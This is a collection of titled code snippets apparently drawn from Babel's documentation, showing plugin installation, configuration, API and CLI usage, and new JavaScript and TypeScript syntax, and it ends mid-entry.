----------------------------------------

TITLE: Implementing Babel Plugin via Node API
DESCRIPTION: JavaScript code showing how to use the V8 spread parameters bugfix plugin programmatically through Babel's Node API

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-bugfix-v8-spread-parameters-in-optional-chaining"],
});

----------------------------------------

TITLE: Using requeueComputedKeyAndDecorators for class method computed keys
DESCRIPTION: Example of using requeueComputedKeyAndDecorators to ensure computed keys of class methods are revisited during traversal.

LANGUAGE: javascript
CODE:
if (path.isMethod()) {
  requeueComputedKeyAndDecorators(path)
}

----------------------------------------

TITLE: Using Babel Plugin via Node API in JavaScript
DESCRIPTION: Shows how to use the optional chaining assignment plugin programmatically via the Node API. It includes the plugin configuration with the version option.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: [["@babel/plugin-proposal-optional-chaining-assign", {
      "version": "2023-07"
    }]],
});

----------------------------------------

TITLE: Installing Metalsmith Babel Plugin with npm/Yarn
DESCRIPTION: This command installs the metalsmith-babel plugin using npm or Yarn. The npm2yarn syntax allows for automatic conversion between npm and Yarn commands.

LANGUAGE: shell
CODE:
npm install metalsmith-babel

----------------------------------------

TITLE: Configuring YAML Front Matter for Babel 7 Migration Blog Post
DESCRIPTION: YAML configuration for a Jekyll blog post about Babel 7 migration. It specifies metadata such as title, authors, date, categories, and custom JavaScript files to be included.

LANGUAGE: yaml
CODE:
---
layout: post
title:  "Upgrade to Babel 7 for Tool Authors (WIP)"
authors: [sven, henry]
date:   2017-02-29 11:00:00
categories: announcements
share_text: "Upgrade to Babel 7 for Tool Authors"
third_party_js:
- https://platform.twitter.com/widgets.js
custom_js_with_timestamps:
- docs.js
---

----------------------------------------

TITLE: Initializing Babel Register with ES6 Import
DESCRIPTION: Demonstrates how to import @babel/register at the entry point of an application using ES6 import syntax. This must be placed at the top of the entry file to ensure it loads first.

LANGUAGE: javascript
CODE:
import "@babel/register";

----------------------------------------

TITLE: Configuring Babel Plugin via Configuration File
DESCRIPTION: JSON configuration to enable the V8 spread parameters bugfix plugin in babel.config.json

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-bugfix-v8-spread-parameters-in-optional-chaining"]
}

----------------------------------------

TITLE: Using Babel Plugin via CLI
DESCRIPTION: Command line usage of the plugin to transform JavaScript files.

LANGUAGE: shell
CODE:
babel --plugins minify-numeric-literals script.js

----------------------------------------

TITLE: Demonstrating Async Do Expressions in JavaScript
DESCRIPTION: This snippet shows how to use async do expressions to issue HTTP requests in parallel. It demonstrates the syntax before and after transformation by the Babel plugin.

LANGUAGE: JavaScript
CODE:
Promise.all([
  async do {
    const result = await fetch('https://example.com/A');
    await result.json()
  },
  async do {
    const result = await fetch('https://example.org/B');
    await result.json()
  },
]).then(([a, b]) => {
  console.log("example.com/A", a);
  console.log("example.org/B", b);
})

LANGUAGE: JavaScript
CODE:
Promise.all([
  (async () {
    const result = await fetch('https://example.com/A');
    return await result.json()
  })(),
  (async () {
    const result = await fetch('https://example.org/B');
    return await result.json()
  })(),
]).then(([a, b]) => {
  console.log("example.com/A", a);
  console.log("example.org/B", b);
})

----------------------------------------

TITLE: Using via Node API
DESCRIPTION: JavaScript code showing how to use the plugin programmatically via Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-proposal-explicit-resource-management"]
});

----------------------------------------

TITLE: Demonstrating TypeScript 4.1 Template Literal Types
DESCRIPTION: This snippet showcases the new template literal types feature in TypeScript 4.1, allowing type-level string concatenation using template literal syntax.

LANGUAGE: typescript
CODE:
type Events = "Click" | "Focus";

type Handler = {
  [K in `on${Events}`]: Function
};

const handler: Handler = {
    onClick() {}, // Ok
    onFocus() {}, // Ok
    onHover() {}, // Error!
};

----------------------------------------

TITLE: Using Babel Plugin via Node API
DESCRIPTION: JavaScript code showing how to use the plugin programmatically through the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-shorthand-properties"],
});

----------------------------------------

TITLE: Installing gulp-babel-minify with npm
DESCRIPTION: Command to install gulp-babel-minify as a dev dependency using npm. This snippet also supports yarn installation through npm2yarn conversion.

LANGUAGE: shell
CODE:
npm install gulp-babel-minify --save-dev

----------------------------------------

TITLE: Babel Config with ^^ Topic Token
DESCRIPTION: Configuration example for babel.config.json using the ^^ topic token for pipeline operator.

LANGUAGE: json
CODE:
{
  "plugins": [
    ["@babel/plugin-proposal-pipeline-operator", { "topicToken": "^^" }]
  ]
}

----------------------------------------

TITLE: Running Nodemon with Babel script
DESCRIPTION: This command demonstrates how to use Nodemon to execute the Babel script defined in package.json.

LANGUAGE: shell
CODE:
nodemon --exec npm run babel-node -- path/to/script.js

----------------------------------------

TITLE: Dynamic Import Configuration
DESCRIPTION: Configuration options for enabling dynamic import() syntax support

LANGUAGE: javascript
CODE:
// .babelrc
{
  "parserOpts": {
    "plugins": ['dynamicImport']
  }
}

----------------------------------------

TITLE: Using Babel ES2016 Preset via CLI
DESCRIPTION: Command line example showing how to use the ES2016 preset when running Babel via CLI.

LANGUAGE: shell
CODE:
babel script.js --presets @babel/preset-es2016

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the plugin as a dev dependency

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-json-modules

----------------------------------------

TITLE: Using Partial Application Plugin via Babel CLI
DESCRIPTION: Command to use the partial application plugin with Babel CLI.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-proposal-partial-application script.js

----------------------------------------

TITLE: Configuring Babel Targets - Old vs New Syntax
DESCRIPTION: Demonstrates the new top-level targets configuration option in Babel that replaces duplicate target specifications across plugins and presets.

LANGUAGE: json
CODE:
{
  "presets": [
    ["@babel/preset-env", {
        "targets": ">1%, not ie 11"
    }]
  ],
  "plugins": [
    ["polyfill-es-shims", {
      "targets": ">1%, not ie 11"
    }]
  ]
}

LANGUAGE: json
CODE:
{
  "targets": ">1%, not ie 11",
  "presets": ["@babel/preset-env"],
  "plugins": ["polyfill-es-shims"]
}

----------------------------------------

TITLE: Applying @babel/plugin-syntax-flow with Babel Node API
DESCRIPTION: JavaScript code snippet demonstrating how to use the @babel/plugin-syntax-flow plugin programmatically with Babel's Node API for code transformation.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-flow"],
});

----------------------------------------

TITLE: Configuring Babel Plugin in JSON Configuration File
DESCRIPTION: This snippet demonstrates how to include the Safari ID destructuring collision bugfix plugin in a Babel configuration file. This is the recommended method for configuring Babel plugins.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-bugfix-safari-id-destructuring-collision-in-function-expression"]
}

----------------------------------------

TITLE: Configuring Gulp task with gulp-babel-minify
DESCRIPTION: Example of how to set up a Gulp task that uses gulp-babel-minify to minify JavaScript files. It demonstrates importing the plugin, creating a task, and configuring minification options.

LANGUAGE: javascript
CODE:
const gulp = require("gulp");
const minify = require("gulp-babel-minify");

gulp.task("minify", () =>
  gulp.src("./build/app.js")
    .pipe(minify({
      mangle: {
        keepClassName: true
      }
    }))
    .pipe(gulp.dest("./dist"));
);

----------------------------------------

TITLE: Transforming Record and Tuple syntax without polyfill
DESCRIPTION: Example of how the plugin transforms Record and Tuple syntax using global Record and Tuple objects without importing a polyfill.

LANGUAGE: javascript
CODE:
let a = #[1, 2, 3];

// ⬇ ⬇ ⬇ ⬇ ⬇ ⬇ ⬇ ⬇ ⬇ ⬇

let a = Tuple(1, 2, 3);

----------------------------------------

TITLE: Installing @babel/template Package
DESCRIPTION: Installation command for adding @babel/template as a development dependency

LANGUAGE: shell
CODE:
npm install --save-dev @babel/template

----------------------------------------

TITLE: Configuring Babel with ES2017 Preset
DESCRIPTION: Demonstrates how to use the new ES2017 preset in a Babel configuration file. This preset includes support for async/await and trailing commas in functions.

LANGUAGE: JavaScript
CODE:
// .babelrc
{ "presets": ["es2017"] }

----------------------------------------

TITLE: Installing babel-jest using npm or yarn
DESCRIPTION: This command installs babel-jest as a development dependency. It's necessary for transforming TypeScript files in Jest testing environments, even though babel-jest is now automatically loaded by Jest.

LANGUAGE: shell
CODE:
npm install --save-dev babel-jest

----------------------------------------

TITLE: Running Babel Transformation Fixture Tests with JavaScript
DESCRIPTION: This code snippet demonstrates how to use the @babel/helper-transform-fixture-test-runner package to run Babel transformation fixture tests. It imports the runFixtures function and calls it with a path to the test fixtures directory.

LANGUAGE: JavaScript
CODE:
import runFixtures from "@babel/helper-transform-fixture-test-runner";

runFixtures("/User/sebmck/Projects/babel-something/test/fixtures");

----------------------------------------

TITLE: Configuring babel-plugin-minify-infinity in babel.config.json
DESCRIPTION: This JSON configuration adds the minify-infinity plugin to the Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["minify-infinity"]
}

----------------------------------------

TITLE: Using Record and Tuple plugin via Babel CLI
DESCRIPTION: Shell command to use the Record and Tuple plugin with Babel CLI for transforming JavaScript files.

LANGUAGE: shell
CODE:
$ babel --plugins @babel/plugin-proposal-record-and-tuple script.js

----------------------------------------

TITLE: Inline regenerator-runtime Helper in JavaScript
DESCRIPTION: Demonstrates the difference in output between old and new Babel versions when compiling generator functions, showing the inline regenerator-runtime helper.

LANGUAGE: JavaScript
CODE:
+function _regeneratorRuntime() { /* ... */ }

-var f = /*#__PURE__*/regeneratorRuntime.mark(function f() {
+var f = /*#__PURE__*/_regeneratorRuntime().mark(function f() {
-  return regeneratorRuntime.wrap(function f$(_context) {
+  return _regeneratorRuntime().wrap(function f$(_context) {
     while (1) {
       switch (_context.prev = _context.next) {
         case 0:
         case "end":
           return _context.stop();
       }
     }
   }, f);
 });

----------------------------------------

TITLE: Using import-source syntax plugin via Babel CLI
DESCRIPTION: This shell command demonstrates how to use the @babel/plugin-syntax-import-source plugin with Babel's command-line interface.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-import-source script.js

----------------------------------------

TITLE: API Usage for gulp-babel-minify
DESCRIPTION: Demonstrates the function signature for using gulp-babel-minify programmatically. It shows how to pass minification options and overrides to the plugin.

LANGUAGE: javascript
CODE:
gulpBabelMinify(minifyOptions, overrides);

----------------------------------------

TITLE: Applying @babel/plugin-syntax-import-meta via Node.js API
DESCRIPTION: JavaScript code snippet demonstrating how to use the @babel/plugin-syntax-import-meta plugin with Babel's Node.js API for code transformation.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-import-meta"]
});

----------------------------------------

TITLE: Installing @babel/traverse Package
DESCRIPTION: Command to install the @babel/traverse package using npm package manager.

LANGUAGE: shell
CODE:
npm install --save @babel/traverse

----------------------------------------

TITLE: Enabling Function Bind Syntax in Babel via Command Line
DESCRIPTION: Shows how to enable the function bind syntax in Babel using command line options, either by stage or by specific transformer.

LANGUAGE: Shell
CODE:
$ babel --stage 0

LANGUAGE: Shell
CODE:
$ babel --optional es7.functionBind

----------------------------------------

TITLE: Babel Configuration Setup
DESCRIPTION: JSON configuration to enable the plugin in babel.config.json file.

LANGUAGE: json
CODE:
{
  "plugins": ["transform-simplify-comparison-operators"]
}

----------------------------------------

TITLE: Configuring @babel/plugin-syntax-numeric-separator in Babel configuration file
DESCRIPTION: JSON configuration to include the @babel/plugin-syntax-numeric-separator plugin in the Babel configuration file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-numeric-separator"]
}

----------------------------------------

TITLE: Demonstrating Updated Decorator Syntax in JavaScript
DESCRIPTION: Illustrates the new flexibility in decorator placement for exported classes and the updated context.access object in decorators.

LANGUAGE: JavaScript
CODE:
// valid
@dec
export class A {}

// valid
export @dec class B {}

// invalid
@dec
export @dec class C {}

LANGUAGE: JavaScript
CODE:
let accessX;

function dec(desc, context) {
  accessX = context.access;
  return dec;
}

class A {
  @dec #x = 1;
}

// old semantics
accessX.get.call(new A) === 1;

// new semantics
accessX.get(new A) === 1;

LANGUAGE: JavaScript
CODE:
// #x in new A
accessX.has(new A) === true;

----------------------------------------

TITLE: Using Property Mutators Plugin via Node API - JavaScript
DESCRIPTION: Example showing how to use the property mutators transform plugin programmatically through the Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-property-mutators"],
});

----------------------------------------

TITLE: Installing broccoli-babel-transpiler as Dev Dependency
DESCRIPTION: Command to install broccoli-babel-transpiler as a development dependency. The npm2yarn marker indicates this command will be automatically converted to its Yarn equivalent in documentation.

LANGUAGE: shell
CODE:
npm install --save-dev broccoli-babel-transpiler

----------------------------------------

TITLE: Using Explicit Resource Management in Babel 7.22.0
DESCRIPTION: Support for the explicit resource management Stage 3 proposal, including async version.

LANGUAGE: JavaScript
CODE:
{
  await using db = connect(databaseURL);
  let user = await db.getUserById(userId);
  await db.createPost(user.name, "Hi! :)");
} // Automatically close the db

----------------------------------------

TITLE: Applying the Babel plugin using Node.js API
DESCRIPTION: Demonstrates how to use the plugin programmatically via the Node.js API when transforming code with Babel.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-object-set-prototype-of-to-assign"],
});

----------------------------------------

TITLE: Registering a custom Babel plugin
DESCRIPTION: Demonstrates how to create and register a custom Babel plugin that modifies identifiers.

LANGUAGE: javascript
CODE:
function lolizer() {
  return {
    visitor: {
      Identifier(path) {
        path.node.name = "LOL";
      },
    },
  };
}
Babel.registerPlugin("lolizer", lolizer);

----------------------------------------

TITLE: Direct Nodemon and Babel-node execution
DESCRIPTION: This command shows how to run Nodemon with Babel-node directly, avoiding potential argument parsing issues by using a double dash.

LANGUAGE: shell
CODE:
nodemon --exec babel-node --presets=@babel/preset-env --ignore='foo\|bar\|baz' -- path/to/script.js

----------------------------------------

TITLE: Configuring Babel for Inline RegExp Modifiers
DESCRIPTION: Demonstrates how to enable the inline RegExp modifiers proposal in Babel configuration by adding the appropriate plugin.

LANGUAGE: JSON
CODE:
{
  "presets": ["@babel/preset-env"],
  "plugins": [
    // Add this!
    "@babel/plugin-proposal-regexp-modifiers"
  ]
}

----------------------------------------

TITLE: Basic Transformation Example in JavaScript
DESCRIPTION: Demonstrates how the plugin transforms strict equality comparison with typeof into loose equality.

LANGUAGE: javascript
CODE:
typeof foo === "object";

LANGUAGE: javascript
CODE:
typeof foo == "object";

----------------------------------------

TITLE: Helper Function Usage Example
DESCRIPTION: Demonstrates how to import and use the helper function with node paths as parameters.

LANGUAGE: javascript
CODE:
import wrapFunction from "@babel/helper-wrap-function";

wrapFunction(nodePathOfTheFunction, nodeWhichReferencesToTheWrapper);

----------------------------------------

TITLE: Using @babel/plugin-transform-dotall-regex via Babel CLI
DESCRIPTION: This command demonstrates how to use the @babel/plugin-transform-dotall-regex plugin with the Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
$ babel --plugins @babel/plugin-transform-dotall-regex script.js

----------------------------------------

TITLE: Configuring Babel for Updated Decorators
DESCRIPTION: Demonstrates how to enable the latest version of the decorators proposal in Babel configuration.

LANGUAGE: JSON
CODE:
{
  "plugins": [
    ["@babel/plugin-proposal-decorators", {
      "version": "2023-05"
    }]
  ]
}

----------------------------------------

TITLE: Declaring Split Export Declaration Function in JavaScript
DESCRIPTION: This snippet declares the default export of the splitExportDeclaration function, which takes a NodePath as an argument. It's used to split export declarations in Babel transformations.

LANGUAGE: JavaScript
CODE:
declare export default splitExportDeclaration(path: NodePath);

----------------------------------------

TITLE: Using Private Destructuring in Babel 7.18.0
DESCRIPTION: Transform support for the Private destructuring Stage 2 proposal.

LANGUAGE: JavaScript
CODE:
class A {
  #x = 2;
  method() {
    const { #x: x } = this;
  }
}

----------------------------------------

TITLE: Basic Babel Configuration
DESCRIPTION: Simple Babel configuration JSON showing how to enable the plugin without options.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-react-jsx-development"]
}

----------------------------------------

TITLE: Registering a custom Babel preset with options
DESCRIPTION: Demonstrates how to create and register a custom Babel preset that includes built-in presets and plugins with specific options.

LANGUAGE: javascript
CODE:
Babel.registerPreset("env-plus", {
  presets: [[Babel.availablePresets["env"], { loose: true }]],
  plugins: [
    [
      Babel.availablePlugins["proposal-decorators"],
      { version: "2023-01" },
    ],
  ],
});

----------------------------------------

TITLE: Importing TransformBabel Task in MSBuild XML
DESCRIPTION: This snippet demonstrates how to import the TransformBabel task from the React.MSBuild assembly into an MSBuild script. It specifies the assembly file path and the task name.

LANGUAGE: xml
CODE:
<UsingTask AssemblyFile="packages\React.MSBuild.2.1.0\React.MSBuild.dll" TaskName="TransformBabel" />

----------------------------------------

TITLE: Installing the Babel Plugin via NPM
DESCRIPTION: Command to install the shorthand properties transform plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-shorthand-properties

----------------------------------------

TITLE: Dynamic Import Input Example
DESCRIPTION: Example of dynamic import syntax that will be transformed by the plugin

LANGUAGE: javascript
CODE:
import("jquery").then($ => {});

----------------------------------------

TITLE: ES6 Class Example in Pug Template with Babel
DESCRIPTION: Shows how to write ES6 JavaScript code within a Pug template using the :babel filter. The example demonstrates ES6 features including class definition, template literals, and method declaration.

LANGUAGE: pug
CODE:
script
  :babel
    console.log("Hello World !!!");
    class Person {
      constructor(name) {
        this.name = name;
      }
      sayName(){
        console.log(`Hello, my name is ${this.name}`);
      }
    }
    var person = new Person("Apoxx");
    person.sayName();

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Command line usage example for applying the type constructor minification plugin.

LANGUAGE: shell
CODE:
babel --plugins minify-type-constructors script.js

----------------------------------------

TITLE: Configuring V8 Intrinsic Syntax Parsing
DESCRIPTION: Shows how to enable V8 intrinsic syntax parsing in Babel parser by adding the v8intrinsic plugin to the parser options.

LANGUAGE: JavaScript
CODE:
const { parse } = require("@babel/parser");

parse(code, {
  plugins: ["v8intrinsic"]
})

----------------------------------------

TITLE: Using Decorators in Babel 7.17.0
DESCRIPTION: Support for the new version of the decorators Stage 2 proposal.

LANGUAGE: JavaScript
CODE:
class A {
  @reactive #x = 2;

  @logger
  method() {
    this.#x++;
  }
}

----------------------------------------

TITLE: Promise Polyfill Example - Original Code
DESCRIPTION: Example showing Promise usage before transformation

LANGUAGE: javascript
CODE:
Promise;

----------------------------------------

TITLE: Class Transform Example - Without Runtime
DESCRIPTION: Transformed class code without @babel/runtime-corejs2, showing duplicated helper function

LANGUAGE: javascript
CODE:
function _classCallCheck(instance, Constructor) {
  //...
}

var Circle = function Circle() {
  _classCallCheck(this, Circle);
};

----------------------------------------

TITLE: Mocha 3 Basic Configuration
DESCRIPTION: Package.json script configuration for Mocha 3 using deprecated --compilers flag with Babel

LANGUAGE: json
CODE:
{
  "scripts": {
    "test": "mocha --compilers js:@babel/register"
  }
}

----------------------------------------

TITLE: Class Properties Transform - Default Output
DESCRIPTION: Example of class properties transform output using Object.defineProperty (default behavior).

LANGUAGE: JavaScript
CODE:
class Bork {
  constructor() {
    Object.defineProperty(this, "x", {
      configurable: true,
      enumerable: true,
      writable: true,
      value: 'bar'
    });
  }
};

Object.defineProperty(Bork, "a", {
  configurable: true,
  enumerable: true,
  writable: true,
  value: 'foo'
});

----------------------------------------

TITLE: Configuring Property Mutators Plugin - JSON
DESCRIPTION: Babel configuration file showing how to enable the property mutators transform plugin.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-property-mutators"]
}

----------------------------------------

TITLE: Babel Plugin Example Using Helper Hoist Variables
DESCRIPTION: Example implementation of a Babel plugin that uses hoistVariables to transform variables inside a function named 'myEval' by hoisting them to the outer scope.

LANGUAGE: javascript
CODE:
import hoistVariables from "@babel/helper-hoist-variables";

// a naive plugin transforms
// `(function myEval(){ var x = 1; })()`
// to
// `var x;(function myEval(){ x = 1; })()`

module.exports = api => {
  return {
    visitor: {
      Function(path) {
        if (path.node.id.name === "myEval") {
          const outerScope = path.scope.parent;
          hoistVariables(
            path.get("body"),
            id => {
              // Use Scope#push to register a `var` binding in
              // the outer scope
              outerScope.push({ id });
            },
            "var"
          );
        }
      },
    },
  };
};

----------------------------------------

TITLE: AMD Transform Output
DESCRIPTION: Example of how dynamic import is transformed for AMD module format

LANGUAGE: javascript
CODE:
define(["require"], function (_require) {
  new Promise((_resolve, _reject) =>
    _require(
      ["jquery"],
      (imported) => _resolve(_interopRequireWildcard(imported)),
      _reject
    )
  ).then(($) => {});
});

----------------------------------------

TITLE: Configuring Babel Optional Chaining Plugin
DESCRIPTION: Configuration setup in babel.config.json to enable the optional chaining syntax plugin.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-optional-chaining"]
}

----------------------------------------

TITLE: Applying Optional Catch Binding Transform via Node API
DESCRIPTION: JavaScript code demonstrating how to use the optional catch binding transform plugin with Babel's Node API.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-optional-catch-binding"],
});

----------------------------------------

TITLE: Using Class Static Blocks in Babel 7.16.0
DESCRIPTION: Enable the class static blocks Stage 4 proposal by default.

LANGUAGE: JavaScript
CODE:
class A {
  static {
    initialize(A);
  }
}

----------------------------------------

TITLE: Modifying Runtime CoreJS Version
DESCRIPTION: Example showing how to update the CoreJS version configuration when upgrading to Babel 8

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/transform-runtime", {
-   corejs: 2
+   corejs: 3
  }]
}

----------------------------------------

TITLE: Unoptimized Babel Output for Nested Functions
DESCRIPTION: This snippet shows the unoptimized output generated by Babel for the previous code example. It includes an unnecessary loop to convert the 'arguments' object to an array.

LANGUAGE: JavaScript
CODE:
var log = function log() {
  var _console;

  return (_console = console).log.apply(_console, arguments);
};

function test_opt() {
  log.apply(undefined, arguments);
}

function test_deopt() {
  for (var _len = arguments.length, args = Array(_len), _key = 0; _key < _len; _key++) { // unnecessary loop
    args[_key] = arguments[_key];
  }

  var fn = function fn() {
    return log.apply(undefined, arguments);
  };
  fn.apply(undefined, args);
}

----------------------------------------

TITLE: TypeScript 3.7 Features: Assertion Functions and Declare in Class Fields
DESCRIPTION: Examples of new TypeScript 3.7 features supported in Babel 7.7.0, including assertion functions and declare keyword in class fields.

LANGUAGE: typescript
CODE:
function assertString(x): assert x is string {
  if (typeof x !== "string") throw new Error("It must be a string!");
}

class Developer extends Person {
  declare usingBabel: boolean;
}

----------------------------------------

TITLE: Using For-Await-Of Loop in Async Function
DESCRIPTION: Shows the syntax for using a 'for await...of' loop within an async function to iterate over asynchronous iterable objects.

LANGUAGE: JavaScript
CODE:
async function f() {
  for await (let x of y) {
    g(x);
  }
}

----------------------------------------

TITLE: Accessing Object Rest/Spread Compatibility Data in JavaScript
DESCRIPTION: This code example shows the structure of compatibility data for the object rest/spread feature, indicating minimum supported versions for various browsers and environments.

LANGUAGE: javascript
CODE:
{
    "chrome": "60",
    "opera": "47",
    "edge": "79",
    "firefox": "55",
    "safari": "11.1",
    "node": "8.3",
    "deno": "1",
    "ios": "11.3",
    "samsung": "8",
    "opera_mobile": "44",
    "electron": "2.0"
}

----------------------------------------

TITLE: Installing babel-plugin-transform-inline-environment-variables via npm
DESCRIPTION: Shows the command to install the Babel plugin using npm as a development dependency.

LANGUAGE: Shell
CODE:
npm install babel-plugin-transform-inline-environment-variables --save-dev

----------------------------------------

TITLE: Configuring Babel with optional chaining assign syntax plugin
DESCRIPTION: JSON configuration for enabling the @babel/plugin-syntax-optional-chaining-assign plugin in a Babel configuration file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-optional-chaining-assign"]
}

----------------------------------------

TITLE: Installing the Babel plugin via npm
DESCRIPTION: Shows the npm command to install the @babel/plugin-transform-object-set-prototype-of-to-assign plugin as a development dependency.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-object-set-prototype-of-to-assign

----------------------------------------

TITLE: Upgrade Dependencies for Babel 7 Beta
DESCRIPTION: Example package.json configuration showing how to upgrade to Babel 7 beta version.

LANGUAGE: JSON
CODE:
{
  "devDependencies": {
    "babel-cli": "7.0.0-beta.0"
  }
}

----------------------------------------

TITLE: Using Pipeline Operator in Babel 7.15.0
DESCRIPTION: Support the "Hack-style" pipeline operator Stage 2 proposal.

LANGUAGE: JavaScript
CODE:
const result = "World" |> `Hello, ${%}!` |> alert(%);

----------------------------------------

TITLE: Class Field Declarations in TypeScript
DESCRIPTION: Example showing how to properly declare class fields in TypeScript when upgrading to Babel 8

LANGUAGE: typescript
CODE:
class A {
  foo: string | void; // initialized to undefined
  declare bar: number; // type-only, will be removed
}

----------------------------------------

TITLE: Updating decorators plugin config in Babel 7
DESCRIPTION: Shows how to update the decorators plugin config to use legacy mode in Babel 7.

LANGUAGE: JSON
CODE:
{
  "plugins": [
-    "@babel/plugin-proposal-decorators"
+    ["@babel/plugin-proposal-decorators", { "legacy": true }]
  ]
}

----------------------------------------

TITLE: Embedding Transistor.fm Podcast Player in JSX
DESCRIPTION: This code snippet demonstrates how to embed a Transistor.fm podcast player using an iframe in JSX. It sets the width to 100% and height to 180px.

LANGUAGE: jsx
CODE:
<iframe src='https://share.transistor.fm/e/b65dd0f9' width='100%' height='180' frameborder='0' scrolling='no' seamless='true' style={{width:"100%", height:"180px"}}></iframe>

----------------------------------------

TITLE: Linking to Babel 7 Migration API Documentation in Markdown
DESCRIPTION: Markdown content providing a link to the new location of the Babel 7 migration guide for API users. It includes a header and a link to the documentation page.

LANGUAGE: markdown
CODE:
## Check out [v7-migration-api](https://babeljs.io/docs/en/next/v7-migration-api)!

----------------------------------------

TITLE: Updating TSTypeParameter AST in Babel 8
DESCRIPTION: The AST structure for TypeScript type parameters has changed in Babel 8. The name property is now an Identifier node instead of a plain string.

LANGUAGE: typescript
CODE:
// T is a TSTypeParameter
function process<T>(input: T): T {}

// AST in Babel 7
{
  type: "TSTypeParameter",
  name: "T",
}

// AST in Babel 8
{
  type: "TSTypeParameter",
  name: { type: "Identifier", name: "T" },
}

----------------------------------------

TITLE: Extending Babel Configuration in Subpackages
DESCRIPTION: Example of extending a root Babel configuration file in subpackages of a monorepo structure.

LANGUAGE: json
CODE:
{ "extends": "../../.babelrc" }

----------------------------------------

TITLE: Installing @babel/plugin-transform-object-rest-spread via npm
DESCRIPTION: This command installs the Babel plugin for object rest/spread transformation as a development dependency.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-object-rest-spread

----------------------------------------

TITLE: Implementing React JSX Source Transform via Node API
DESCRIPTION: JavaScript code showing how to use the plugin programmatically through Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-react-jsx-source"],
});

----------------------------------------

TITLE: Type Constructor Minification Example Input
DESCRIPTION: Example of type constructor calls before minification, showing various common constructor patterns.

LANGUAGE: javascript
CODE:
Boolean(x);
Number(x);
String(x);
Array(3);
Array(3,1);
Object({foo: 'bar'});

----------------------------------------

TITLE: Using Records and Tuples in Babel 7.13.0
DESCRIPTION: Support for the Records and Tuples proposals.

LANGUAGE: JavaScript
CODE:
let rec = #{ x: 1 };
let tup = #[1, 2, 3];

----------------------------------------

TITLE: Basic Node API Function Signature
DESCRIPTION: The basic function signature for using babel-minify in Node.js, showing the three main parameters: input, minifyOptions, and overrides.

LANGUAGE: javascript
CODE:
const minify = require("babel-minify");

minify(input, minifyOptions, overrides);

----------------------------------------

TITLE: Declare Fields Example
DESCRIPTION: Demonstrates the behavior of the allowDeclareFields option with type-only class fields.

LANGUAGE: javascript
CODE:
class A {
  declare foo: string; // Removed
  bar: string; // Initialized to undefined
}

----------------------------------------

TITLE: Updating ImportExpression AST in Babel 8
DESCRIPTION: The AST structure for dynamic import() expressions has changed in Babel 8. The new ImportExpression node replaces the previous CallExpression with Import callee.

LANGUAGE: typescript
CODE:
// Example input
import("foo", options);

// AST in Babel 7
{
  type: "CallExpression",
  callee: { type: "Import" },
  arguments: [
    StringLiteral("foo"),
    Identifier("options")
  ]
}

// AST in Babel 8
{
  type: "ImportExpression",
  source: StringLiteral("foo"),
  options: Identifier("options")
}

----------------------------------------

TITLE: Constant Re-exports Example
DESCRIPTION: Demonstration of how constantReexports assumption affects module exports.

LANGUAGE: javascript
CODE:
export { value } from "dependency";

----------------------------------------

TITLE: Configuring Loose Mode for Nullish Coalescing Operator Transform
DESCRIPTION: Shows how to configure the 'loose' option for the nullish coalescing operator transform, which uses loose equality checks instead of strict equality checks.

LANGUAGE: JSON
CODE:
{
  "assumptions": {
    "noDocumentAll": true
  }
}

----------------------------------------

TITLE: Import Attributes Syntax Update
DESCRIPTION: Shows how to update import assertions to the new import attributes syntax

LANGUAGE: javascript
CODE:
- import value from "module" assert { type: "json" };
+ import value from "module" with { type: "json" };

----------------------------------------

TITLE: Compiling Object Rest Spread in JavaScript
DESCRIPTION: Demonstrates the compiled output of object rest spread, using a helper function to extract properties.

LANGUAGE: JavaScript
CODE:
const { a } = c; // remove the `...b`
const b = _objectWithoutProperties(c, ["a"]); // use the helper

----------------------------------------

TITLE: Using String Names for Imports and Exports in Babel 7.12.0
DESCRIPTION: Support for imports and exports string names.

LANGUAGE: JavaScript
CODE:
let happy = "wooo!";
export { happy as "😃" };

----------------------------------------

TITLE: Using @babel/helpers Inside a Babel Plugin
DESCRIPTION: Example of using @babel/helpers within a Babel plugin visitor, showing how to add a helper to the file and use it in transformations.

LANGUAGE: javascript
CODE:
export default {
  visitor: {
    UnaryExpression(path) {
      // The .addHelper function adds, if needed, the helper to the file
      // and returns an expression which references the helper
      const typeofHelper = this.addHelper("typeof");
      t.isExpression(typeofHelper); // true
  }
};

----------------------------------------

TITLE: Configuring Babel to use flow-strip-types plugin
